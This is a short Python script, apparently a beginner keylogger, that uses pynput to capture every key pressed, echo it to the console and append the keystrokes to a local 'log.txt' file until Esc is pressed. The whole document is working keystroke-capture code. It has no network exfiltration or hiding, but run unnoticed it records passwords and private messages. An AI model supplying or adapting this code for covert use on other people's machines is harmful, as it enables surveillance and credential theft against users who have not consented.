import pynput
from pynput.keyboard import Key, Listener

c = 0
keys =[]


def on_press(key):
    global keys,c
    keys.append(key)
    c +=1
    print ("{0} pressed".format(key))
    if c >1:
        c=0
        log(keys)
        keys =[]


def on_release(key):
    if key == Key.esc:
        return False

def log(keys):
    with open("log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')

            elif 'Key' in k:
                f.write(k.replace('Key.',''))
                f.write('\n')
            else:
                f.write(k)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
